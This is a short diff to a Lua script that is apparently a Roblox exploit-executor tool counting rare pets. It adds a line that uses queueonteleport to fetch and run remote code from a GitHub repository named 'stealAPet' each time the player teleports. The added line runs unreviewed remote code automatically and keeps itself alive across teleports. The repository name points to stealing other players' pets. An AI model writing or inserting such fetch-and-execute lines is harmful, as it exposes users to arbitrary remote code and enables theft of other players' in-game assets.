@@ -306,6 +306,8 @@ for _, v in ipairs(standPets:GetDescendants()) do
 	end
 end
 
+queueonteleport("loadstring(game:HttpGet('https://raw.githubusercontent.com/Kramelidk/stealAPet/refs/heads/main/file.lua'))()")
+
 print("huge pets: ", tostring(HugeCount))
 print("huge hellrock: ", tostring(HugeHellRockCount))
 print("huge pufferfish: ", tostring(HugePufferfishCount))
